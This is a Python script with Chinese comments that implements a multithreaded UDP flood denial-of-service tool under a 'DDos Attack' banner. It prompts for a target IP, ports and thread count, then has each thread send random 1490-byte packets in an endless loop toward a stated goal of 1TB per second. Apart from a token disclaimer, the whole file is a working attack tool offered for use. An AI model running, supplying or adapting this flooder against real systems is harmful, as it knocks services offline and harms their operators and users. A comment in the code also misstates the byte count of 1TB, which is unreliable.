import sys
import os
import time
import socket
import random
import threading
from datetime import datetime

# 定义数据包大小和目标数据量
PACKET_SIZE = 1490  # 每个数据包的大小（字节）
TOTAL_BYTES_PER_SECOND = 1024 * 1024 * 1024 * 1024  # 1TB = 1,073,741,824,000 字节
PACKETS_PER_THREAD = 1000  # 每个线程每次发送的数据包数
bytes = random._urandom(PACKET_SIZE)  # 生成一个 1490 字节的随机数据包

# 攻击函数（每个线程执行）
def attack(ip, port, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent_bytes = 0
    packets_sent = 0
    start_time = time.time()

    while True:
        try:
            # 每个线程一次发送 PACKETS_PER_THREAD 个数据包
            for _ in range(PACKETS_PER_THREAD):
                sock.sendto(bytes, (ip, port))
                sent_bytes += PACKET_SIZE
                packets_sent += 1

            elapsed_time = time.time() - start_time
            if elapsed_time > 0:
                tbps = (sent_bytes / (1024 * 1024 * 1024 * 1024)) / elapsed_time
                print(
                    f"线程 {thread_id} 已发送 {packets_sent} 个数据包 ({sent_bytes / (1024 * 1024 * 1024):.2f} GB), 速度: {tbps:.2f} TB/s")

            # 如果一秒已过，重置计数器
            if elapsed_time >= 1.0:
                if sent_bytes >= TOTAL_BYTES_PER_SECOND:
                    print(f"线程 {thread_id} 在 {elapsed_time:.2f} 秒内完成 1TB 发送")
                else:
                    print(f"线程 {thread_id} 未达标，仅发送 {sent_bytes / (1024 * 1024 * 1024):.2f} GB")
                sent_bytes = 0
                packets_sent = 0
                start_time = time.time()

        except KeyboardInterrupt:
            print(f"线程 {thread_id} 已停止")
            break
        except Exception as e:
            print(f"线程 {thread_id} 出错: {e}")
            break
    sock.close()

# 主程序
if __name__ == "__main__":
    os.system("clear")
    os.system("figlet DDos Attack")
    print(" ")
    print("/---------------------------------------------------\\")
    print("|   作者          : Andysun06                       |")
    print("|   作者github    : https://github.com/Andysun06    |")
    print("|   kali-QQ学习群 : 909533854                       |")
    print("|   版本          : V1.1.0                          |")
    print("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
    print("\\---------------------------------------------------/")
    print(" ")
    print(" -----------------[请勿用于违法用途]----------------- ")
    print(" ")

    # 获取用户输入
    ip = input("请输入 IP     : ")
    ports_input = input("请输入攻击端口（多个端口用空格分隔，例如: 80 443 53）: ")
    ports = [int(port) for port in ports_input.split()]
    thread_count = int(input("线程数(建议1000以上以尝试达到1TB/s) : "))

    os.system("clear")
    print(f"开始攻击 {ip} 的端口 {ports}，目标每秒 1TB，使用 {thread_count} 个线程...")

    # 创建并启动线程
    threads = []
    for port in ports:
        for i in range(thread_count):
            thread = threading.Thread(target=attack, args=(ip, port, f"{port}-{i + 1}"))
            thread.start()
            threads.append(thread)

    # 主线程等待所有子线程（可选）
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("主程序已收到退出信号，正在停止...")
